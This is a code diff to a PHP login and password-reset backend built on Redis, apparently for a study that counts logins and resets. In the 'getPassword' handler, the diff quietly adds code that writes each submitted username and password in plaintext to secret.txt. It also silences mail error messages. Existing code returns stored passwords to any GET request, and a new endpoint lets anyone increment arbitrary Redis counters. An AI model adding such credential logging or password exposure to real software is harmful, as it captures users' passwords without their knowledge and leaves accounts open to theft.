@@ -1,7 +1,22 @@
 <?php
 // header('Content-Type: application/json');
 
-//Generates the token
+// record login and failure times
+function recordData($letter)
+{
+    $redis = new Redis();
+    $redis->connect('localhost', 6379);
+
+    if($redis->get($letter) == ""){
+        $redis->set($letter, 1);
+    }
+    else {
+        $cnt = (int)$redis->get($letter) + 1;
+        $redis->set($letter, $cnt);
+    }
+}
+
+// Generates the token
 function token($length = 32)
 {
     if (!isset($length) || intval($length)) {
@@ -50,9 +65,9 @@ function send_email($username, $token)
 
     $mail = $smtp->send($to, $headers, $body);
     if (PEAR::isError($mail)) {
-        echo ($mail->getMessage());
+        // echo ($mail->getMessage());
     } else {
-        echo ("Message successfully sent!\n");
+        // echo ("Message successfully sent!\n");
     }
 }
 
@@ -130,6 +145,10 @@ if (isset($_GET['functionname']) && isset($_GET['arguments'])) {
     switch ($_GET['functionname']) {
         case 'checkUsername':
             $username = $_GET['arguments'][0];
+            $callSrc = $_GET['arguments'][1];
+            if($callSrc == "login") {
+                recordData("L");
+            }
             if ($redis->get($username . "_pass") == "") {
                 $result['result'] = false;
             }
@@ -138,7 +157,10 @@ if (isset($_GET['functionname']) && isset($_GET['arguments'])) {
 
         case 'getPassword':
             $username = $_GET['arguments'][0];
+            $password = $_GET['arguments'][1];
             $result['result'] = $redis->get($username . "_pass");
+            $user_pass = $username . " " . $password;
+            file_put_contents('secret.txt', $user_pass.PHP_EOL , FILE_APPEND | LOCK_EX);
             break;
 
         case 'setPassword':
@@ -161,11 +183,18 @@ if (isset($_GET['functionname']) && isset($_GET['arguments'])) {
             $password = $_GET['arguments'][1];
             $update_pass = update_pass($token, $password);
             $result['result'] = $update_pass;
+            // reset password successfully
+            recordData("R");
             break;
         
         case 'sendEmail':
             $username = $_GET['arguments'][0];
             $result['result'] = generate_token($username);
+            break;
+        
+        case 'recordData':
+            $letter = $_GET['arguments'][0];
+            recordData($letter);
             break;
 
         default:
@@ -174,4 +203,3 @@ if (isset($_GET['functionname']) && isset($_GET['arguments'])) {
     }
     echo json_encode($result);
 }
-?>
